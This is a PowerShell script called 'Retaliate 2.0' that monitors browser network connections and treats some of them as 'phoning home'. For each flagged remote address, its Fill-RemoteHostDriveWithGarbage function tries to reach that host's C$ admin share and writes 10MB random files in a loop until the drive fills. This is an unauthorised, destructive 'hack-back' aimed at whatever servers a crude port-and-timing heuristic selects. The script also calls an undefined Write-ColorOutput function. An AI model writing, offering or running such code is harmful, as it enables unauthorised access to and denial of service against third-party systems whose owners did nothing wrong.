# Retaliate 2.0
# Author: Gorstak

# --- Monitor mode (NTM) ---
$script:AllowedDomains = @()
$script:AllowedIPs = @()
$script:RetaliatedConnections = @{}
$script:MonitoringActive = $true
$script:CurrentBrowserConnections = @{}

# Browsers only: monitoring and retaliation apply solely to these processes.
$BrowserProcesses = @(
    'chrome', 'firefox', 'msedge', 'iexplore', 'opera', 'brave', 'vivaldi', 'waterfox', 'palemoon',
    'seamonkey', 'librewolf', 'tor', 'dragon', 'iridium', 'chromium', 'maxthon', 'slimjet', 'citrio',
    'blisk', 'sidekick', 'epic', 'ghostery', 'falkon', 'kinza', 'orbitum', 'coowon', 'coc_coc_browser',
    'browser', 'qqbrowser', 'ucbrowser', '360chrome', '360se', 'sleipnir', 'k-meleon', 'basilisk',
    'floorp', 'pulse', 'naver', 'whale', 'coccoc', 'yandex', 'avastbrowser', 'asb', 'avgbrowser',
    'ccleanerbrowser', 'dcbrowser', 'edge', 'edgedev', 'edgebeta', 'edgecanary', 'operagx', 'operaneon',
    'bravesoftware', 'browsex', 'browsec', 'comet', 'elements', 'flashpeak', 'surf'
)

# Gaming (and all non-browser apps) are never monitored or retaliated against - explicitly unhindered.
$GamingProcesses = @(
    'steam', 'steamwebhelper', 'epicgameslauncher', 'origin', 'battle.net', 'eadesktop', 'ea app',
    'ubisoft game launcher', 'gog galaxy', 'rungame', 'gamebar', 'gameservices', 'overwolf'
)

# Never retaliate against these IPs (common DNS). Retaliating would break resolution for everyone.
$NeverRetaliateIPs = @('8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1')

function Add-AllowedDomain {
    param([string]$Domain)
    $Domain = $Domain -replace '^https?://', '' -replace '/$', ''
    $Domain = ($Domain -split '/')[0]
    if ($Domain -match '^[\d\.]+$' -or $Domain -match '^[\da-f:]+$') {
        if ($script:AllowedIPs -notcontains $Domain) {
            $script:AllowedIPs += $Domain
            Write-ColorOutput "Added allowed IP: $Domain" "Green"
        }
        return
    }
    if ($script:AllowedDomains -notcontains $Domain) {
        $script:AllowedDomains += $Domain
        Write-ColorOutput "Added allowed domain: $Domain" "Green"
        try {
            $IPs = [System.Net.Dns]::GetHostAddresses($Domain) | ForEach-Object { $_.IPAddressToString }
            foreach ($IP in $IPs) {
                if ($script:AllowedIPs -notcontains $IP) {
                    $script:AllowedIPs += $IP
                    Write-ColorOutput "  Resolved IP: $IP" "Gray"
                }
            }
        } catch {
            Write-ColorOutput "  Warning: Could not resolve domain to IP" "Yellow"
        }
    }
}

function Test-IsActiveBrowsing {
    param([string]$RemoteAddress, [string]$ProcessName, [int]$RemotePort)
    
    # Check if this is a browser process
    if ($BrowserProcesses -notcontains $ProcessName.ToLower()) {
        return $false
    }
    
    # Check if it's a local/private IP (always allow)
    if ($RemoteAddress -match '^(127\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)') {
        return $true
    }
    
    # Check if it's in the never-retaliate list
    if ($NeverRetaliateIPs -contains $RemoteAddress) {
        return $true
    }
    
    # Check if it's in the allowed list
    if ($script:AllowedIPs -contains $RemoteAddress) {
        return $true
    }
    
    $Now = Get-Date
    
    # Check if this is a navigation connection (HTTP/HTTPS on ports 80/443)
    if ($RemotePort -eq 443 -or $RemotePort -eq 80) {
        $script:CurrentBrowserConnections[$RemoteAddress] = $Now
        Write-ColorOutput "ACTIVE NAVIGATION: ${RemoteAddress}:${RemotePort} (Process: $ProcessName)" "Cyan"
        return $true
    }
    
    # Check if there was recent navigation (within 30 seconds) - this is a dependency
    foreach ($BrowserIP in $script:CurrentBrowserConnections.Keys) {
        $ConnectionTime = $script:CurrentBrowserConnections[$BrowserIP]
        $TimeDiff = ($Now - $ConnectionTime).TotalSeconds
        if ($TimeDiff -le 30) {
            Write-ColorOutput "DEPENDENCY: ${RemoteAddress}:${RemotePort} (linked to active navigation)" "Gray"
            return $true
        }
    }
    
    # Not active browsing - this is likely phoning home
    return $false
}

function Fill-RemoteHostDriveWithGarbage {
    param(
        [string]$RemoteAddress,
        [int]$RemotePort,
        [string]$ProcessName,
        [string]$ProgramPath
    )
    try {
        # Attempt to access the remote host's C$ share (admin share)
        $remotePath = "\\$RemoteAddress\C$"
        
        # Check if the remote path is accessible (requires admin rights)
        if (Test-Path $remotePath) {
            $counter = 1
            while ($true) {
                try {
                    $filePath = Join-Path -Path $remotePath -ChildPath "garbage_$counter.dat"
                    $garbage = [byte[]]::new(10485760) # 10MB in bytes
                    (New-Object System.Random).NextBytes($garbage)
                    [System.IO.File]::WriteAllBytes($filePath, $garbage)
                    Write-ColorOutput "Wrote 10MB to $filePath" "Yellow"
                    $counter++
                }
                catch {
                    # Stop if the drive is full or another error occurs
                    if ($_.Exception -match "disk full" -or $_.Exception -match "space") {
                        Write-ColorOutput "Drive at $remotePath is full or inaccessible. Stopping." "Yellow"
                        break
                    }
                    else {
                        Write-ColorOutput "Error writing to $filePath : $_" "Red"
                        break
                    }
                }
            }
        }
        else {
            Write-ColorOutput "Cannot access $remotePath - check permissions or connectivity." "Yellow"
        }
    }
    catch {
        Write-ColorOutput "General error: $_" "Red"
    }
}

function Start-ConnectionMonitoring {
    $SeenConnections = @{}
    while ($script:MonitoringActive) {
        $Connections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue |
            Where-Object { $_.RemoteAddress -ne '0.0.0.0' -and $_.RemoteAddress -ne '::' }
        foreach ($Conn in $Connections) {
            $Key = "$($Conn.RemoteAddress):$($Conn.RemotePort):$($Conn.OwningProcess)"
            if ($SeenConnections.ContainsKey($Key)) { continue }
            $SeenConnections[$Key] = $true
            try {
                $Process = Get-Process -Id $Conn.OwningProcess -ErrorAction Stop
                $ProcessName = $Process.ProcessName
                $ProcessPath = $Process.Path
            } catch { $Process = $null; $ProcessName = "Unknown"; $ProcessPath = $null }
            $procName = ($ProcessName -replace '\.exe$','').Trim().ToLower()
            if ($procName -notin $BrowserProcesses) {
                continue
            }
            
            # Check if this is active browsing (navigation or dependency)
            $IsActiveBrowsing = Test-IsActiveBrowsing -RemoteAddress $Conn.RemoteAddress -ProcessName $ProcessName -RemotePort $Conn.RemotePort
            
            # If not active browsing, this is likely phoning home - retaliate
            if (-not $IsActiveBrowsing) {
                $retaliateKey = "$($Conn.RemoteAddress)|$ProcessName"
                if (-not $script:RetaliatedConnections.ContainsKey($retaliateKey)) {
                    Write-ColorOutput "PHONING HOME DETECTED: $($Conn.RemoteAddress):$($Conn.RemotePort) (Process: $ProcessName)" "Red"
                    Fill-RemoteHostDriveWithGarbage -RemoteAddress $Conn.RemoteAddress -RemotePort $Conn.RemotePort -ProcessName $ProcessName -ProgramPath $ProcessPath
                    $script:RetaliatedConnections[$retaliateKey] = @{
                        IP = $Conn.RemoteAddress
                        Port = $Conn.RemotePort
                        Process = $ProcessName
                        Timestamp = Get-Date
                    }
                }
            }
        }
        $Now = Get-Date
        $ToRemove = @()
        foreach ($IP in $script:CurrentBrowserConnections.Keys) {
            if (($Now - $script:CurrentBrowserConnections[$IP]).TotalSeconds -gt 60) { $ToRemove += $IP }
        }
        foreach ($IP in $ToRemove) { $script:CurrentBrowserConnections.Remove($IP) }
        Start-Sleep -Seconds 2
    }
}

    # Start monitoring - this will run indefinitely until MonitoringActive is set to false
    Start-ConnectionMonitoring
